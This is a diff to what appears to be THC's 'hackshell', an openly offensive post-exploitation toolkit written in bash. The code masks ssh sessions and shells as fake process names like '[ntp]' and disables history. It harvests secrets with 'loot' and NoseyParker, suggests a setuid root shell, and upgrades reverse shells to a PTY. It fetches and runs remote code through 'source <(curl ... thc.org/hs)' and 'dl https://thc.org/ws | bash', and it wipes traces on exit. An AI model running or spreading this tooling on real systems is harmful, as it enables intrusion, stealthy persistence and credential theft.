@@ -34,6 +34,9 @@ CW="\033[1;37m"
 
 
 ### Functions to keep in memory
+_hs_dep() {
+    command -v "${1:?}" >/dev/null || { HS_ERR "Not found: ${1} [Install with ${CDC}bin ${1}${CDR} first]"; return 255; }
+}
 HS_ERR()  { echo -e >&2  "${CR}ERROR: ${CDR}$*${CN}"; }
 HS_WARN() { echo -e >&2  "${CY}WARN: ${CDM}$*${CN}"; }
 HS_INFO() { echo -e >&2 "${CDG}INFO: ${CDM}$*${CN}"; }
@@ -41,14 +44,12 @@ xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
 xsu() {
     local name="${1:?}"
     local u g h
-    local cmd="python"
 
-    command -v python3 >/dev/null && cmd="python3"
-    [ $UID -ne 0 ] && { HS_ERR "Need root"; return; }
+    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return; }
     u=$(id -u ${name:?}) || return
     g=$(id -g ${name:?}) || return
     h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)" || return
-    HOME="${h:-/tmp}" "$cmd" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
+    HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
 }
 
 xtmux() {
@@ -59,14 +60,13 @@ xtmux() {
 }
 
 xssh() {
-
     local ttyp
-    echo -e "May need to cut & paste:${CDC}
-reset -I
-PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
-"'stty -echo;printf "\\033[18t";read -t5 -rdt R;stty sane $(echo "$R"|awk -F";" '"'"'{ printf "rows "$3" cols "$2; }'"'"')'"${CN}"
-    ttyp=$(stty -g)
-    stty raw -echo opost
+    echo -e "May need to cut & paste:  ${CDC}source <(curl -SsfL https://thc.org/hs)${CN}"
+#reset -I
+#PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
+#"'stty -echo;printf "\\e[18t";read -t5 -rdt R;stty sane $(echo "$R"|awk -F";" '"'"'{ printf "rows "$3" cols "$2; }'"'"')'"${CN}"
+    ttyp=$(stty --save)
+    stty raw -echo icrnl opost
     ssh "${HS_SSH_OPT[@]}" -T \
         "$@" \
         "unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'exec -a [uid] bash -i' /dev/null"
@@ -254,8 +254,8 @@ ${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53$"
 
 crt() {
     [ $# -ne 1 ] && { HS_ERR "crt <domain-name>"; return 255; }
-    command -v jq >/dev/null || { HW_ERR "Command not found: jq"; return 255; }
-    command -v anew >/dev/null || { HW_ERR "Command not found: anew"; return 255; }
+    _hs_dep jq || return
+    _hs_dep anew || return
     curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
 }
 
@@ -266,6 +266,17 @@ rdns () {
 ghostip() {
     source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
 }
+
+ltr() {
+	[ $# -le 0 ] && set -- .
+    find "$@" -printf "%T@ %M %u %g % 10s %Tb %Td %Tk:%TM %p\n" | sort -n | cut -f2- -d' '
+}
+
+lssr() {
+	[ $# -le 0 ] && set -- .
+    find "$@" -printf "%s %M %u %g % 10s %Tb %Td %Tk:%TM %p\n" | sort -n | cut -f2- -d' '
+}
+
 
 hide() {
     local _pid="${1:-$$}"
@@ -293,6 +304,7 @@ hs_mkxhome() {
 }
 
 cdx() { cd "${XHOME}" || return; }
+xcd() { cdx; }
 
 # Keep this seperate because this actually creates data.
 xhome() {
@@ -313,19 +325,20 @@ keep() {
 
 np() {
     local cmdl=()
-    command -v noseyparker >/dev/null || { HS_ERR "Not found: noseyparker. Type ${CDC}bin noseyparker${CDR} first."; return 255;}
+    _hs_dep noseyparker || return
     [ -t 1 ] && {
         HS_WARN "Use ${CDC}np $*| less -R${CN} instead."
         return;
     }
     command -v nice >/dev/null && cmdl=("nice" "-n19")
     cmdl+=("noseyparker")
-	local d="/tmp/.np-${UID}-$$"
-	[ -d "${d}" ] && rm -rf "${d:?}"
+	_HS_NP_D="/tmp/.np-${UID}-$$"
+	[ -d "${_HS_NP_D}" ] && rm -rf "${_HS_NP_D:?}"
 	[ $# -le 0 ] && set - .
-	NP_DATASTORE="$d" "${cmdl[@]}" -q scan "$@" >&2 || return
-	NP_DATASTORE="$d" "${cmdl[@]}" report --color=always
-	rm -rf "${d:?}"
+	NP_DATASTORE="$_HS_NP_D" "${cmdl[@]}" -q scan "$@" >&2 || return
+	NP_DATASTORE="$_HS_NP_D" "${cmdl[@]}" report --color=always
+	rm -rf "${_HS_NP_D:?}"
+    unset _HS_NP_D
 }
 
 zapme() {
@@ -497,12 +510,12 @@ lootlight() {
             echo -e "${CB}B00M-SHELL ${CDY}${CF}"
             echo "${str}"
             echo -en "${CN}"
-            echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
+            echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
         }
     }
 
     unset str
-    if command -v pgrep >/dev/null; then
+    if command -v pgrep >/dev/null && pgrep --help 2>/dev/null | grep -qFm1 -- --list-full ; then
         str="$(pgrep -x 'ssh' -a)"
     elif command -v ps >/dev/null; then
         str="$(ps alx | grep "ssh " | grep -v grep)"
@@ -572,11 +585,42 @@ loot() {
     lootlight
 }
 
+
 ws() {
     dl https://thc.org/ws | bash
 }
 
+_hs_resize() {
+    local R
+    command -v reset >/dev/null && TERM=xterm reset -I
+    # NOTE: On localhost, this wont always work because xterm responds to fast and
+    # before 'read' gets executed.
+    stty -echo;printf "\e[18t"; read -t5 -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F";" '{printf "rows "$3" cols "$2;}')
+}
+
+_hs_mk_pty() {
+    local str='stty -echo;printf "\\e[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F\; '"'"'{printf "rows "$3" cols "$2;}'"'"')'
+    echo -e "${CDM}Upgrading to PTY Shell${CN}"
+    echo -e ">>> Press ${CDC}Ctrl-z${CN} now and cut & paste ${CDC}stty raw -echo icrnl opost; fg${CN}"
+    echo -e ">>> ${CG}AFTERWARDS${CDG}, Press enter to continue"
+    read -r
+    echo -e ">>> Cut & paste ${CDC} source <(curl -SsfL https://thc.org/hs)${CN}${CF}
+[If this is not what you want then please start again with ${CDC}${CF}export NOPTY=1${CN}${CF}]${CN}"
+
+    if [ -n "$HS_PY" ]; then
+        exec "${HS_PY:-python}" -c "import pty; pty.spawn('${SHELL:-sh}')"
+    elif command -v script >/dev/null; then
+        exec script -qc "${SHELL:-sh}" /dev/null
+    fi
+
+    HS_ERR "Not found: python or script"
+}
+
 _hs_destruct() {
+    [ -n "$_HS_NP_D" ] && [ -d "${_HS_NP_D}" ] && {
+        rm -f "${_HS_NP_D:?}"
+        unset _HS_NP_D
+    }
     [ -z "$XHOME" ] && return
     [ ! -d "$XHOME" ] && return
     echo -e ">>> Cleansing ${CDY}${XHOME}${CN}"
@@ -665,6 +709,21 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
     [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
     export _HS_HOME_ORIG="$HOME"
 
+    [ -z "${HS_PY}" ] && HS_PY="$(command -v python)"
+    [ -z "${HS_PY}" ] && HS_PY="$(command -v python3)"
+    [ -z "${HS_PY}" ] && HS_PY="$(command -v python2)"
+    HS_PY="${HS_PY##*/}"
+
+    TERM="xterm-256color"
+
+    [ -z "$NOPTY" ] && {
+        # Upgrade to PTY shell
+        [ ! -t 0 ] && _hs_mk_pty
+
+        # Set cols/rows if not set (==0)
+        [ -t 0 ] && command -v stty >/dev/null && stty -a |grep -qFm1 -- "rows 0" && _hs_resize
+    }
+
     if [ -n "$BASH" ]; then
         trap hs_exit EXIT SIGHUP SIGTERM SIGPIPE
     else
@@ -686,9 +745,6 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
     hs_init_dl
 }
 
-_hs_dep() {
-    command -v "${1:?}" >/dev/null || { HS_ERR "Not found: ${1}. Try ${CDC}bin ${1}${CDR} first"; return 255; }
-}
 
 # Show common name of remote server
 cn() {
@@ -794,7 +850,7 @@ ${CDC} np <directory>                        ${CDM}Display secrets with NoseyPar
 ${CDC} loot                                  ${CDM}Display common secrets
 ${CDC} ws                                    ${CDM}WhatServer - display server's essentials
 ${CDC} bin                                   ${CDM}Download useful static binaries
-${CDC} lt, lss, psg, lsg, ...                ${CDM}Common useful shotcuts
+${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
 }
